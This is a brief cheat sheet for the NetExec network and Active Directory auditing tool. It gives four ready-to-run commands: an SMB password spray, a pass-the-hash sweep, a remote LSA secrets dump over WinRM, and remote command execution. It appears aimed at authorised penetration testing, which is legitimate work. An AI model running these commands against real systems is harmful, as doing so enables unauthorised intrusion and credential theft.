# 🛠️ NetExec (formerly CrackMapExec) Master Guide

> [!INFO] 📌 **Tool Metadata**
> - **Category**: Swiss Army Knife for Network & Active Directory Auditing (#1 Choice)
> - **Installation**: `sudo apt install netexec` (`npx` / `pipx`)
> - **Primary Objective**: Multi-threaded network service auditing, password spraying, hash dumping, privilege verification, and command execution across SMB, WinRM, SSH, RDP, WMI, MSSQL, and LDAP.

---

## 💻 Practical Command Workflows

```bash
# 1. SMB Password Spray across Subnet
npx netexec smb 10.10.10.0/24 -u users.txt -p "Summer2026!" --continue-on-success

# 2. Pass-the-Hash Check across SMB Services
npx netexec smb 10.10.10.0/24 -u administrator -H "b4b9b02e6f09a9bd760f388b67351e2b" --local-auth

# 3. Dump LSA Secrets remotely via WinRM
npx netexec winrm 10.10.10.50 -u admin -p Password123 --lsa

# 4. Execute Remote Command via SMB
npx netexec smb 10.10.10.50 -u admin -p Password123 -x "whoami /all"
```
